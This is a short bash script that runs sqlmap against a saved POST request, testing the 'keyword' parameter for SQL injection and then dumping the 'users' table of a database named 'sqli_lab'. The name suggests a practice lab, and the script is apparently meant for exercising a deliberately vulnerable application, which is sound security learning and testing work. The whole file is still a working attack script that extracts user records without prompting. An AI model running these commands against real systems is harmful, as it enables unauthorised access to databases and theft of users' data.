#!/usr/bin/env bash
set -e
sqlmap -r requests/unsafe-post.req -p keyword --batch
sqlmap -r requests/unsafe-post.req -p keyword -D sqli_lab -T users --dump --batch
